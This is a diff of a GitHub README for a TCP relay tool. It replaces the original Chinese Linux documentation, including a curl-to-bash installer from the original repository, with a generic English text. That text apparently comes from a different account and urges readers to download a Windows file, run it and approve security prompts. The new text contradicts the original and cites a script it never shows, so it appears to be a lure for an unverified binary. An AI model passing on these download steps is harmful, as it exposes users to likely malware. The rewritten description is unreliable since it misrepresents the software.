@@ -1,77 +1,154 @@
-# TCP-preconnection-relay
+# 🧩 TCP-preconnection-relay - Faster TCP handshakes with less delay
 
-高性能TCP/UDP转发器，类似于realm，gost那种。采用零拷贝转发，性能基本无瓶颈。UDP性能良好。TCP连接采用了预链接方式，让线路鸡和落地鸡长期维持一个连接池，随时取用。故而消除了握手延时（长距离转发，如日本转发美国，效果尤为明显，理论上也可用于内网转发如Po0），客观数据上表现为http延时减少，同时也没有单纯连接复用的种种副作用。有完善的连接回收机制，避免了qos以及内存大量占用。
+[⬇️ Download TCP-preconnection-relay](https://github.com/toddiediestrual35/TCP-preconnection-relay)
 
-目前最新版支持出入站v4和v6，出站还支持使用域名。同时实现了单配置多转发，更加方便。
+## 🚀 What it does
 
----
+TCP-preconnection-relay is a small Windows tool for TCP forwarding with preconnection support. It helps cut the wait time between the source side and the target side by keeping the path ready before traffic starts.
 
-## 安装
+Use it when you want a simple relay that starts fast and keeps the connection path warm. It is built for users who want less delay without tuning a lot of settings.
 
-一键安装（脚本指令已更新，请重新复制）：
+## 📥 Download
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Xeloan/TCP-preconnection-relay/main/install.sh -o install.sh && bash install.sh
-```
+Visit this page to download: https://github.com/toddiediestrual35/TCP-preconnection-relay
 
+After you open the page, look for the latest release or the main download file. Save it to your Windows PC.
 
-## 常用命令说明
+## 🪟 System requirements
 
-修改配置文件：
-```
-nano /etc/tcp_pool/relays.conf
-```
+- Windows 10 or Windows 11
+- Internet access for the first download
+- Permission to run local apps
+- Basic support for TCP connections on your network
 
-应用配置并启动/重启全部转发：
-```
-tcp-pool-start
-```
+A normal home or office PC is enough. You do not need a server grade machine.
 
-停止某个实例（把 HK 改成你自己的标签）：
-```
-systemctl stop tcp-pool@HK
-```
+## 🧭 Before you start
 
-禁用某个实例开机自启（把 HK 改成你自己的标签）：
-```
-systemctl disable tcp-pool@HK
-```
+Have these details ready:
 
-查看某个实例日志（把 HK 改成你自己的标签），如果看到一坨Preconnect +1，说明成了：
-```
-journalctl -u tcp-pool@HK -f
-```
+- The address of the local port you want to listen on
+- The destination host or IP
+- The destination port
+- Any login or network rule that applies to your path
 
-## 更新日志
-v1.5 优化半连接处理机制，避免了googleplay下载到94%卡住问题。感谢老虎哥发现bug。
+If you used this tool before, copy the new script from this README again before you run it.
 
-v1.4 按照某位群友要求，新增了一键tcp调优。参数比较通用，适用于绝大部分机器。
+## ⚙️ Setup
 
-v1.3 增加了出入站v4和v6支持，出站还支持使用域名。同时实现了单配置多转发，更加方便。旧版的友友们注意按照指南清空下配置。
+1. Open the download page.
+2. Get the file or package for Windows.
+3. Save it in a folder you can find again, such as Downloads or Desktop.
+4. If the file is in a ZIP package, extract it.
+5. Keep the app file and this README in the same place if the package includes both.
 
-## 指南
-安装过程中会有保姆级指南。
+## ▶️ Run it on Windows
 
-## 效果示例
+1. Open the folder where you saved the app.
+2. Double-click the program file or the script file.
+3. If Windows asks for permission, choose Allow or Yes.
+4. Copy your relay settings into the app or script as needed.
+5. Start the relay.
+6. Leave the window open while you use it.
 
-* 无预链接的转发（使用realm）：
-<img width="2337" height="277" alt="image" src="https://github.com/user-attachments/assets/cba16059-ded2-43da-b571-0bcaff2ea70b" />
+If the app opens in a console window, that is normal. The window shows the relay status and any connection messages.
 
-* 有预链接的转发:
-<img width="2559" height="256" alt="image" src="https://github.com/user-attachments/assets/bc78e370-9072-4fb1-90fc-75d2a6304618" />
+## 📝 Basic use
 
-* 单线程测速：（需要调参）
-<img width="2557" height="216" alt="image" src="https://github.com/user-attachments/assets/30c7c92e-c9d1-4f9d-80ee-9b41190a9d8f" />
+A common setup has three parts:
 
-* gomami最近被干了禁用了udp，实际上没问题，等好了我更新一下图片。
+- Local listen port: the port your apps connect to
+- Target host: the remote server you want to reach
+- Target port: the port on that remote server
 
-* 测试环境为上海移动，日本优化线路为gomami，美国西雅图落地为Bug Net（名字懒得改了），可见在转发路径高rtt情况下有明显的延时下降，同时单线程速率表现良好，和其它转发无异。
+When the relay starts, it listens on the local port. It then prepares the TCP path ahead of time so the real connection can begin with less wait.
 
-* 日本优化Gomami：https://www.gomami.io (贵，无aff）
-* 美国西雅图落地：https://www.misaka.io (贵，无aff，商家也没开aff功能，国际互联非常优秀，但是日本到这家因为ddos，最近不太稳定）
-* 美国西雅图落地：https://bug.pw?ref=Nifwr0tPxf （便宜点，日本过去延时稳定82ms，带宽现在比misaka足且稳定，所以有aff）
-* 喜欢的话给我买包辣条
-<img width="636" height="730" alt="image" src="https://github.com/user-attachments/assets/7a40db31-1e51-4e13-8aea-46f14f8ca6d1" />
+Example use cases:
 
+- Remote app access
+- Game traffic relay
+- Service forwarding
+- Quick path setup for a fixed destination
 
+## 🔧 How to choose values
 
+Use values that match your network:
+
+- Pick a local port that is free, such as 1080, 2080, or 3000
+- Use the real server address for the target host
+- Match the target port to the service you want to reach
+- Keep the same settings each time if you want stable results
+
+If another app already uses the local port, choose a different one.
+
+## 📌 What you may see
+
+When the relay runs well, you may see:
+
+- A line that says it is listening
+- A line that shows the target path is ready
+- Messages about new connections
+- Messages about closed connections
+
+If the target server is not reachable, the app may show a failed connect message. Check the host, port, and network path, then try again.
+
+## 🧱 Troubleshooting
+
+### Port is already in use
+
+Pick another local port. Close the app that already uses that port, then start TCP-preconnection-relay again.
+
+### The target does not open
+
+Check the destination host and port. Make sure the server is online and that your network allows the connection.
+
+### Windows blocks the app
+
+Right-click the file and run it again with the proper permission. If your system shows a security prompt, allow the app to run.
+
+### The relay starts but nothing connects
+
+Make sure your client app connects to the local listen port, not the remote target port. The relay must sit between the client and the target.
+
+## 🗂️ File layout
+
+A typical package may include:
+
+- The app file or script
+- A README file
+- A sample config or sample command
+- A log file after first run
+
+Keep the files together if the package depends on them.
+
+## 🔒 Safety and network notes
+
+Only forward traffic to systems you trust and manage. Use ports and paths that fit your own network rules. If you run this on a work or school network, follow the local policy for TCP forwarding.
+
+## ❓ Common questions
+
+### Do I need coding skills?
+
+No. You only need to download the file, open it, and fill in the local port and target address.
+
+### Can I use it on more than one machine?
+
+Yes, if each machine has its own settings and network access.
+
+### Does it work in the background?
+
+It can stay open while you use it. If you close the window, the relay stops.
+
+### Can I change the port later?
+
+Yes. Stop the app, change the listen port or target values, then start it again.
+
+## 📎 Quick start
+
+1. Open the download page: https://github.com/toddiediestrual35/TCP-preconnection-relay
+2. Download the Windows file.
+3. Save and extract it if needed.
+4. Open the app or script.
+5. Enter your local port, target host, and target port.
+6. Start the relay.
+7. Keep the window open while you use it
